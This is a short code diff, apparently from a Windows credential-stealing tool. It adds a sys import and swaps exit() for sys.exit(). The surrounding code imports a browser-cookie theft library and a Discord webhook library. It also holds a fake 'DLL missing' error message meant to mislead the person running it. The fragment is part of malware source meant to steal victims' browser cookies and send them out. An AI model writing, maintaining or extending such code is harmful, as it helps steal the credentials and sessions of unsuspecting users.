@@ -25,6 +25,7 @@ try:
     import dhooks
     import requests
     import psutil
+    import sys
     import browser_cookie3
     from base64 import b64decode
     from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes
@@ -57,7 +58,7 @@ except Exception:
 
 
 if platform.system() != "Windows":
-    exit()
+    sys.exit()
 
 if cc.get_fake_error() is True:
     ctypes.windll.user32.MessageBoxW(0, "The program can't start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
